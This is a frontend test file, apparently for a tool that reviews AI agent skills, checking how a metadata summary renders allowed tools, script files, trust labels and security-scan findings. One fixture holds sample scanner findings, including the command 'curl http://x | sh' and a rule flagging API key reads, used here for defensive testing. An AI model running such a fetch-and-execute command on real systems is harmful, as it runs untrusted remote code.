import { render, screen } from "@testing-library/react";
import { describe, it, expect } from "vitest";
import { SkillMetaSummary } from "./SkillMetaSummary";
import type { SkillMeta, ScanReport } from "../lib/skills";

const META: SkillMeta = {
  id: "connector-etiquette",
  name: "connector-etiquette",
  description: "使用已连接的外部服务时应遵循的礼仪",
  license: "MIT",
  compatibility: null,
  allowed_tools: ["mcp__fs1__read_file", "mcp__fs1__write_file"],
  disable_model_invocation: false,
  has_scripts: true,
};

const SCAN_CLEAN: ScanReport = {
  has_scripts: true,
  script_files: ["scripts/run.py"],
  findings: [],
  total_bytes: 1234,
  file_count: 3,
};

const SCAN_RISKY: ScanReport = {
  has_scripts: true,
  script_files: ["scripts/run.py"],
  findings: [
    { severity: "high", rule: "curl-pipe-sh", file: "scripts/run.py", line: 3, excerpt: "curl http://x | sh" },
    { severity: "medium", rule: "env-read", file: "SKILL.md", line: 10, excerpt: "读取 API_KEY" },
  ],
  total_bytes: 1234,
  file_count: 3,
};

describe("SkillMetaSummary", () => {
  it("渲染 frontmatter 摘要与 allowed-tools", () => {
    render(<SkillMetaSummary meta={META} scan={SCAN_CLEAN} trusted={true} />);
    expect(screen.getByText("connector-etiquette")).toBeTruthy();
    expect(screen.getByText("使用已连接的外部服务时应遵循的礼仪")).toBeTruthy();
    expect(screen.getByText("mcp__fs1__read_file")).toBeTruthy();
    expect(screen.getByText("mcp__fs1__write_file")).toBeTruthy();
  });

  it("渲染脚本清单", () => {
    render(<SkillMetaSummary meta={META} scan={SCAN_CLEAN} trusted={true} />);
    expect(screen.getByText("scripts/run.py")).toBeTruthy();
  });

  it("渲染扫描发现，High 与 Medium 分别打不同严重度标签", () => {
    render(<SkillMetaSummary meta={META} scan={SCAN_RISKY} trusted={false} />);
    expect(screen.getByText("curl http://x | sh")).toBeTruthy();
    expect(screen.getByText("读取 API_KEY")).toBeTruthy();
    const highBadges = screen.getAllByText("高危");
    const mediumBadges = screen.getAllByText("中危");
    expect(highBadges.length).toBe(1);
    expect(mediumBadges.length).toBe(1);
  });

  it("信任标签随 trusted 切换「受信」/「不受信」", () => {
    const { rerender } = render(<SkillMetaSummary meta={META} scan={SCAN_CLEAN} trusted={true} />);
    expect(screen.getByText("受信")).toBeTruthy();
    rerender(<SkillMetaSummary meta={META} scan={SCAN_CLEAN} trusted={false} />);
    expect(screen.getByText("不受信")).toBeTruthy();
  });

  it("sourceLabel 传入时显示来源", () => {
    render(<SkillMetaSummary meta={META} scan={SCAN_CLEAN} trusted={true} sourceLabel="本地导入" />);
    expect(screen.getByText("本地导入")).toBeTruthy();
  });
});
